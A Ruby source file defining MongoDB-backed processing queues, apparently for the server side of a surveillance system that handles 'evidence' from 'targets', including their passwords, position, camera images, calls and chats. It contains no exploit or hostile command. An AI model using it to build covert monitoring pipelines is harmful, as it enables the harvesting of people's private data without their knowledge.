require 'mongoid'

#module RCS
#module DB

class NotificationQueue
  extend RCS::Tracer

  @@queues = []

  QUEUED = 0
  PROCESSED = 1
  SIZE = 50_000_000
  MAX = 100_000

  def self.inherited(klass)
    @@queues << klass
  end

  def self.create_queues
    db = RCS::DB::DB.instance.mongo_connection
    collections = db.collections.map {|c| c.name}
    # damned mongoid!! it does not support capped collection creation
    @@queues.each do |k|
      begin
        next if collections.include? k.collection.name
        k.mongo_session.command(create: k.collection.name, capped: true, size: k::SIZE, max: k::MAX)
      rescue Exception => e
        trace :error, "Cannot create queue #{k.name}: #{e.message}"
      end
    end
  end

  def self.get_queued
    entry = self.where(flag: NotificationQueue::QUEUED).find_and_modify({"$set" => {flag: NotificationQueue::PROCESSED}}, new: false)
    count = self.where({flag: NotificationQueue::QUEUED}).count() if entry
    return entry ? [entry, count] : nil
  end

end

class AlertQueue < NotificationQueue
  include Mongoid::Document

  field :alert, type: Array
  field :evidence, type: Array
  field :path, type: Array
  field :to, type: String
  field :subject, type: String
  field :body, type: String
  field :flag, type: Integer, default: QUEUED

  store_in collection: 'alert_queue'
  index({flag: 1}, {background: true})

  # override the inherited method
  def self.add(params)
    self.create! do |aq|
      aq.alert = [params[:alert]._id] if params[:alert]
      aq.evidence = [params[:evidence]._id] if params[:evidence]
      aq.path = params[:path]
      aq.to = params[:to]
      aq.subject = params[:subject]
      aq.body = params[:body]
    end
  rescue Exception => e
    trace :error, "Cannot queue alert: #{e.message}"
    trace :fatal, "EXCEPTION: [#{e.class}] " << e.backtrace.join("\n")
  end
end


class PushQueue < NotificationQueue
  include Mongoid::Document

  SIZE = 50_000
  MAX = 1000

  field :type, type: String
  field :message, type: Hash, default: {}
  field :flag, type: Integer, default: QUEUED

  store_in collection: 'push_queue'
  index({flag: 1}, {background: true})

  def self.add(type, message)
    trace :debug, "Adding to #{self.name}: #{type} #{message}"

    # insert it in the queue
    self.create!({type: type, message: message})
  end
end


class OCRQueue < NotificationQueue
  include Mongoid::Document

  field :target_id, type: String
  field :evidence_id, type: String
  field :flag, type: Integer, default: QUEUED

  store_in collection: 'ocr_queue'
  index({flag: 1}, {background: true})

  def self.add(target_id, evidence_id)
    trace :debug, "Adding to #{self.name}: #{target_id} #{evidence_id}"

    # insert it in the queue
    self.create!({target_id: target_id.to_s, evidence_id: evidence_id.to_s})
  end
end


class TransQueue < NotificationQueue
  include Mongoid::Document

  field :target_id, type: String
  field :evidence_id, type: String
  field :flag, type: Integer, default: QUEUED

  store_in collection: 'trans_queue'
  index({flag: 1}, {background: true})

  def self.add(target_id, evidence_id)
    trace :debug, "Adding to #{self.name}: #{target_id} #{evidence_id}"

    # insert it in the queue
    self.create!({target_id: target_id.to_s, evidence_id: evidence_id.to_s})
  end
end


class AggregatorQueue < NotificationQueue
  include Mongoid::Document

  field :target_id, type: String
  field :evidence_id, type: String
  field :flag, type: Integer, default: QUEUED

  store_in collection: 'aggregator_queue'
  index({flag: 1}, {background: true})

  AGGREGATOR_TYPES = ['call', 'message', 'chat']

  def self.add(target_id, evidence_id, type)
    # skip not interesting evidence
    return unless AGGREGATOR_TYPES.include? type

    trace :debug, "Adding to #{self.name}: #{target_id} #{evidence_id}"

    self.create!({target_id: target_id.to_s, evidence_id: evidence_id.to_s})
  end
end

class IntelligenceQueue < NotificationQueue
  include Mongoid::Document

  field :target_id, type: String
  field :evidence_id, type: String
  field :flag, type: Integer, default: QUEUED

  store_in collection: 'intelligence_queue'
  index({flag: 1}, {background: true})

  INTELLIGENCE_TYPES = ['addressbook', 'password', 'position', 'camera']

  def self.add(target_id, evidence_id, type)
    # skip not interesting evidence
    return unless INTELLIGENCE_TYPES.include? type

    trace :debug, "Adding to #{self.name}: #{target_id} #{evidence_id}"

    self.create!({target_id: target_id.to_s, evidence_id: evidence_id.to_s})
  end

end

#end # ::DB
#end # ::RCS